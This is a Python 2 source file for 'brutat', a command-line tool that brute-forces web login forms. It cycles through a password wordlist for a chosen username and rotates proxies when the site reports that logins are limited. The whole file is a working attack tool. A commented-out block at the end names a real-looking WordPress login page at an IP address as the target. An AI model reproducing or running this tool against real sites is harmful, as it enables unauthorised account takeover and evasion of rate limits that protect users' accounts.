#!/usr/bin/python
# encoding=utf8

'''
	Author : Osama Roza
	Web Site : www.codear.top
	Version: 0.1
	Date: start 29/8/2017
'''

import mod as mod
from pynput.keyboard import Key, Listener
import linecache as alllines
import sys
import os
from termcolor import colored
logo = '''
 ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓ ▄▄▄     ▄▄▄█████▓
▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▒████▄   ▓  ██▒ ▓▒
▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒██  ▀█▄ ▒ ▓██░ ▒░
▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ░██▄▄▄▄██░ ▓██▓ ░
░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░  ▓█   ▓██▒ ▒██▒ ░
░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░    ▒▒   ▓▒█░ ▒ ░░
▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░      ▒   ▒▒ ░   ░
 ░    ░   ░░   ░  ░░░ ░ ░   ░        ░   ▒    ░
 ░         ░        ░                    ░  ░
      ░          For linux  @el2t
'''

print colored(logo, 'red')

print '''
 Syntax:-----------------------------------------------------------------------
        -createdb                                 [ Create database           ]
        -----------------------------------------------------------------------
        -view                                     [ View database record      ]
        -----------------------------------------------------------------------
        -run  [ default timeout 1.0 proxy false ] [ Run brute force           ]
        -run -timeout   [ 2.0 ]                   [ Run with timeout          ]
        -run -proxy   [ true / false ]            [ Active proxy list         ]
        -run -text    [ true / false ]            [ Show login text message   ]
        -run -html    [ true / false ]            [ Show html source code     ]
        -----------------------------------------------------------------------
        -set -url                                 [ Set target url            ]
        -set -username                            [ Set username              ]
        -set -passlist                            [ Set password list         ]
        -set -proxylist                           [ Set proxy list            ]
        -set -userinput                           [ Set username input filed  ]
        -set -passinput                           [ Set password input filed  ]
        -set -loginf                              [ Set login failed message  ]
        -set -loginl                              [ Set login limited message ]
        -----------------------------------------------------------------------
        -help                                     [ Show advanced help message]
        -quit                                     [ Exit brutat               ]
        -----------------------------------------------------------------------'''


class main:

    def __init__(self, rowid, site, proxy, passp, proxyp, cpassword, username, specline, passlist, proxylist, passlen, proxylen, setproxy, timeout, err, time, ptext, phtml):
        self.rowid = rowid          # column key
        self.site = site            # site url
        self.passp = passp          # password progress bar
        self.proxyp = proxyp        # proxy progress bar
        self.cpassword = cpassword  # correct password save here
        self.username = username    # login username
        self.passlist = passlist    # password list
        self.proxylist = proxylist  # proxy list
        self.passlen = passlen      # number of words in wordlist
        self.proxylen = proxylen    # number of [ip:port] in proxylist
        self.specLine = specline    # selected password by [passp] from [passlist]
        self.proxy = proxy          # selected proxy by [proxyp] from [proxylist]
        self.time = time            # opration time taking
        self.setproxy = setproxy    # enable or disable proxy by [true or false]
        self.timeout = timeout      # request timeout
        self.ptext = ptext
        self.phtml = phtml
        self.err = err              # catching error message


    def refresh_var_row(self):
        data_in.load_record()
        self.rowid = data_in.lrowid
        self.site = data_in.lsite
        self.passp = data_in.lpassp
        self.proxyp = data_in.lproxyp
        self.cpassword = data_in.lcpassword
        self.username = data_in.lusername
        self.passlist = data_in.lpasslist
        self.proxylist = data_in.lproxylist
        self.passlen = data_in.lpasslen
        self.proxylen = data_in.lproxylen
        self.specLine = start_s.specLine
        self.time = start_s.time


    def run(self):


        data_in.len_files(self.passlist, self.proxylist)

        while self.passp <= self.passlen:
            start_s = mod.start_scan(self.site, self.passp, self.proxyp, self.timeout, self.passlist, self.proxylist,
                                     self.proxylen, self.username, '')
            try:
                try:
                    data_in.load_record()
                    self.refresh_var_row()

                    if self.setproxy == 'true':
                        start_s.useproxy()

                    start_s.con(self.timeout)

                    cek = start_s.htmltotxt

                    if data_in.lloginf in cek:
                        # os.system('clear')
                        p = self.passp + 1
                        data_in.update_row('', p, '', '', '', '', '', '', '', '', '', '', '', 1)
                        self.refresh_var_row()
                        self.login_failed()
                        
                        
                    if data_in.lloginl in cek:
                        # os.system('clear')
                        x = self.proxyp + 1
                        data_in.update_row('', '', x, '', '', '', '', '', '', '', '', '', '', 1)
                        self.refresh_var_row()
                        self.login_limited()

                    else:
                        specLine = alllines.getline(self.passlist, self.passp).split('\n')
                        dic = []
                        dic.append(specLine)
                        del dic[0][1]
                        cp = dic[0][0]
                        # cp = self.specLine
                        data_in.update_row('', '', '', cp, '', '', '', '', '', '', '', '', '', 1)
                        self.login_success()

                        break
                except Exception as self.err:
                    # os.system('clear')
                    self.error_msg()
                    if self.proxyp == self.proxylen:
                        x = 1
                    else:
                        x = self.proxyp + 1
                    data_in.update_row('', '', x, '', '', '', '', '', '', '', '', '', '', 1)
            except KeyboardInterrupt:
                break
        if self.passp == self.passlen:
            print colored('we test all password in wordlist\n', 'red')






    # Login msg and error && view record

    def login_success(self):
        os.system('clear')
        print start_s.htmltotxt
        start_s.timer()
        self.time = start_s.time
        self.refresh_var_row()
        print colored('''
        +---------------------------------------
        |          {~ Login Success ~}
        +---------------------------------------
        |  Duration:  |  %s
        +-------------+-------------------------
        |  Username   |  %s
        +-------------+-------------------------
        |  Password   |  %s
        +-------------+-------------------------
        ''', 'green') % (self.time, self.username, self.specLine)




    def login_failed(self):
        if self.ptext or self.phtml == 'true':
            print 'monitor mod'
        else:
            os.system('clear')

        start_s.timer()
        self.time = start_s.time
        self.refresh_var_row()

        print colored('''
        +---------------------------------------
        |      [ X ]login failed
        +---------------------------------------
        |  Duration:  |  %s
        +-------------+-------------------------
        |  Site       |  %s
        +-------------+-------------------------
        |  Proxy      |  %s
        +-------------+-------------------------
        |  Proxy list |  %s
        +-------------+-------------------------
        |  Pass list  |  %s
        +-------------+-------------------------
        |  Pass len   |  %s from %s
        +-------------+-------------------------
        |  Proxy len  |  %s from %s
        +-------------+-------------------------
        |  Username   |  %s
        +-------------+-------------------------
        |  Password   |  %s
        ''', 'red') % (
        self.time, self.site, self.proxy, self.proxylist, self.passlist, self.passp, self.passlen, self.proxyp, self.proxylen, self.username, self.specLine)

        if self.phtml == 'true':
            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ START OF SOURCE CODE ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')
            print start_s.html
            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ END OF SOURCE CODE ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')

        if self.ptext == 'true':
            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ START OF TEXT ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')
            print start_s.htmltotxt
            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ END OF TEXT ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')


    def login_limited(self):
        if self.ptext or self.phtml == 'true':
            print 'monitor mod'
        else:
            os.system('clear')

        start_s.timer()
        self.time = start_s.time
        self.refresh_var_row()

        print colored('''
        +---------------------------------------
        |      [ X ]login limited
        +---------------------------------------
        |  Duration:  |  %s
        +-------------+-------------------------
        |  Site       |  %s
        +-------------+-------------------------
        |  Proxy      |  %s
        +-------------+-------------------------
        |  Proxy list |  %s
        +-------------+-------------------------
        |  Pass list  |  %s
        +-------------+-------------------------
        |  Pass len   |  %s from %s
        +-------------+-------------------------
        |  Proxy len  |  %s from %s
        +-------------+-------------------------
        |  Username   |  %s
        +-------------+-------------------------
        |  Password   |  %s
        ''', 'red') % (
        self.time, self.site, self.proxy, self.proxylist, self.passlist, self.passp, self.passlen, self.proxyp, self.proxylen, self.username, self.specLine)

        if self.phtml == 'true':
            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ START OF SOURCE CODE ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')
            print start_s.html
            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ END OF SOURCE CODE ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')

        if self.ptext == 'true':
            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ START OF TEXT ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')
            print start_s.htmltotxt
            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ END OF TEXT ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')



    def error_msg(self):
        start_s.timer()
        self.time = start_s.time
        self.refresh_var_row()
        print colored('''
        +---------------------------------------
        | Error: %s
        +---------------------------------------
        |  Duration:  |  %s
        +-------------+-------------------------
        |  timeout    |  %s
        +-------------+-------------------------
        |  Site       |  %s
        +-------------+-------------------------
        |  Proxy %s |  %s
        +-------------+-------------------------
        |  Proxy list |  %s
        +-------------+-------------------------
        |  Pass list  |  %s
        +-------------+-------------------------
        |  Pass len   |  %s from %s
        +-------------+-------------------------
        |  Proxy len  |  %s from %s
        +-------------+-------------------------
        |  Username   |  %s
        +-------------+-------------------------
        |  Password   |  %s
        ''', 'red') % (
        self.err, self.time, self.timeout, self.site, self.setproxy, start_s.printproxy, self.proxylist, self.passlist, self.passp, self.passlen, self.proxyp, self.proxylen, self.username, self.specLine)


    def view_records(self):
        data_in.load_record()
        self.refresh_var_row()
        print colored('''
    +---------------------------------------
    |            View records
    +-------------+-------------------------
    |  site       |  %s
    +-------------+-------------------------
    |  real pass  |  %s
    +-------------+-------------------------
    |  proxy list |  %s
    +-------------+-------------------------
    |  pass list  |  %s
    +-------------+-------------------------
    |  pass len   |  %s from %s
    +-------------+-------------------------
    |  proxy len  |  %s from %s
    +-------------+-------------------------
    |  username   |  %s
    +-------------+-------------------------
    ''', 'green') % (self.site, self.cpassword, self.proxylist, self.passlist, self.passp, self.passlen, self.proxyp, self.proxylen, self.username)

        self.cmdline()




    def cmdline(self):
        commandline = []
        useri = raw_input('>')
        commandline.append(useri.split())
        x = commandline[0]
        if '-set' in x:
            if '-h' in x:
                print 'Syntax: -set -url http://example.com -username admin -passlist wordlist.txt -proxylist proxylist.txt'
                self.cmdline()
            if '-url' in x:
                try:
                    i = x.index('-url')
                    i += 1
                    v = x[i]
    # site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userinput, passinput, loginf, loginl
                    data_in.update_row(v, '', '', '', '', '', '', '', '', '', '', '', '', 1)
                    print colored('%s has been set as target', 'green') % v
                except:
                    print colored('[Error] Target has not been set', 'red')
            if '-proxylist' in x:
                i = x.index('-proxylist')
                i += 1
                v = x[i]
                try:
    # site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userinput, passinput, loginf, loginl
                    data_in.update_row('', '', 1, '', '', '', v, '', '', '', '', '', '', 1)
                    print colored('%s has been set as Proxylist', 'green') % v
                except Exception as e:
                    print colored('[Error] Proxylist has not been set', 'red')
                    print e
            if '-username' in x:
                try:
                    i = x.index('-username')
                    i += 1
                    v = x[i]
    # site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userinput, passinput, loginf, loginl
                    data_in.update_row('', 1, '', '', v, '', '', '', '', '', '', '', '', 1)
                    print colored('%s has been set as Username', 'green') % v
                except:
                    print colored('[Error] Username has not been set', 'red')
            if '-passlist' in x:
                i = x.index('-passlist')
                i += 1
                v = x[i]
    # site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userinput, passinput, loginf, loginl
                try:
                    data_in.update_row('', 1, '', '', '', v, '', '', '', '', '', '', '', 1)
                    print colored('%s has been set as Passlist', 'green') % v
                except Exception as e:
                    print colored('[Error]Passlist has not been set', 'red')
                    print e
            if '-userinput' in x:
                i = x.index('-userinput')
                i += 1
                v = x[i]
    # site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userinput, passinput, loginf, loginl
                try:
                    data_in.update_row('', '', '', '', '', '', '', '', '', v, '', '', '', 1)
                    print colored('%s has been set as username input field', 'green') % v
                except Exception as e:
                    print colored('[Error]username input field has not been set', 'red')
            if '-passinput' in x:
                i = x.index('-passinput')
                i += 1
                v = x[i]
    # site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userinput, passinput, loginf, loginl
                try:
                    data_in.update_row('', '', '', '', '', '', '', '', '', '', v, '', '', 1)
                    print colored('%s has been set as password input field', 'green') % v
                except Exception as e:
                    print colored('[Error]password input field has not been set', 'red')
            if '-loginf' in x:
                i = x.index('-loginf')
                i += 1
                v = x[i]
    # site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userinput, passinput, loginf, loginl
                try:
                    data_in.update_row('', '', '', '', '', '', '', '', '', '', '', v, '', 1)
                    print colored('%s has been set as login failed message', 'green') % v
                except Exception as e:
                    print colored('[Error]login failed message has not been set', 'red')
            if '-loginl' in x:
                i = x.index('-loginl')
                i += 1
                v = x[i]
    # site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userinput, passinput, loginf, loginl
                try:
                    data_in.update_row('', '', '', '', '', '', '', '', '', '', '', '', v, 1)
                    print colored('%s has been set as login failed message', 'green') % v
                except Exception as e:
                    print colored('[Error]login failed message has not been set', 'red')

            if '-startfrom' in x:
                i = x.index('-startfrom')
                i += 1
                v = x[i]
                try:
# site, passprog, proxyprog, password, username, passlist, proxylist, passlen, proxylen, userinput, passinput, loginf, loginl
                    data_in.update_row('', v, '', '', '', '', '', '', '', '', '', '', '', 1)
                    print colored('The next task will start from %s', 'green') % v
                except Exception as e:
                    print colored('[Error] while set next task', 'red')
                    print e
            try:
                commandline[0][1]
            except:
                print '''Syntax: -set -url http://example.com -username admin -passlist wordlist.txt -proxylist proxylist.txt

        -view                 [ View database record ]
        -set -url             [ Set target url       ]
        -set -username        [ Set username         ]
        -set -passlist        [ Set password list    ]
        -set -proxylist       [ Set proxy list       ]
        -quit                 [ Exit brutat          ]                        '''

            self.cmdline()

        if '-run' in x:

            if '-timeout' in x:
                try:

                    i = x.index('-timeout')
                    i += 1
                    v = x[i]
                    self.timeout = v
                    print colored('timeout= %s ', 'green') % self.timeout
                except:
                    print colored('[Error] timeout has not been set by default timeout = 1.0', 'red')
            if '-proxy' in x:
                try:
                    i = x.index('-proxy')
                    i += 1
                    v = x[i]
                    if v == 'true':
                        self.setproxy = v
                    else:
                        self.setproxy = 'false'

                except:
                    print colored('[Error] Proxy Disabled', 'red')
            if '-text' in x:
                try:
                    i = x.index('-text')
                    i += 1
                    v = x[i]
                    if v == 'true':
                        self.ptext = 'true'
                    else:
                        self.ptext = 'false'
                except:
                    print colored('[Error] Proxy Disabled', 'red')
            if '-html' in x:
                try:
                    i = x.index('-html')
                    i += 1
                    v = x[i]
                    if v == 'true':
                        self.phtml = 'true'
                    else:
                        self.phtml = 'false'
                except:
                    print colored('[Error] Proxy Disabled', 'red')

# ( rowid, site, proxy, passp, proxyp, cpassword, username, specline, passlist, proxylist, passlen,
                # proxylen, setproxy, timeout, err, time, ptext, phtml):

            main('', '', '', '', '', '', '', '', '', '', '', '', self.setproxy, self.timeout, '', '', self.ptext, self.phtml).run()

        if '-createdb' in x:
            mod.create_db()

        if '-view' in x:
            self.view_records()
            self.cmdline()
        if '-help' in x:
            os.system('clear')
            print '''
 Syntax:-----------------------------------------------------------------------
        -createdb                                 [ Create database           ]
        -----------------------------------------------------------------------
        -view                                     [ View database record      ]
        -----------------------------------------------------------------------
        -run  [ default timeout 1.0 proxy false ] [ Run brute force           ]
        -run -timeout   [ 2.0 ]                   [ Run with timeout          ]
        -run -proxy   [ true / false ]            [ Active proxy list         ]
        -run -text    [ true / false ]            [ Show login text message   ]
        -run -html    [ true / false ]            [ Show html source code     ]
        -----------------------------------------------------------------------
        -set -url                                 [ Set target url            ]
        -set -username                            [ Set username              ]
        -set -passlist                            [ Set password list         ]
        -set -proxylist                           [ Set proxy list            ]
        -set -userinput                           [ Set username input filed  ]
        -set -passinput                           [ Set password input filed  ]
        -set -loginf                              [ Set login failed message  ]
        -set -loginl                              [ Set login limited message ]
        -----------------------------------------------------------------------
        -help                                     [ Show advanced help message]
        -quit                                     [ Exit brutat               ]
        -----------------------------------------------------------------------'''
            self.cmdline()
        if '-quit' in x:
            quit()
        else:
            print colored('Syntax: -set -url http://example.com -username admin -passlist wordlist.txt -proxylist proxylist.txt')
            self.cmdline()
        self.cmdline()

if __name__ == '__main__':
    start_s = mod.start_scan('', '', '', '', '', '', '', '', '', '')
    main_f = main('', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '')
    data_in = mod.data_con('', '', '', '', '', '', '', '', '', '', '', '', '', '')
    main_f.cmdline()




    '''
    command_line(sys.argv[1:])
    # mod.create_db()
    data_in.update_row('http://41.239.100.68/wp/wp-login.php', 1, 1, '', 'el2t', '', '', '', '', 1)
    data_in.load_record()
    main('', '', '', '', '', '', '', '', '', '', '', '', '', '', '', use_proxy).run()
    '''
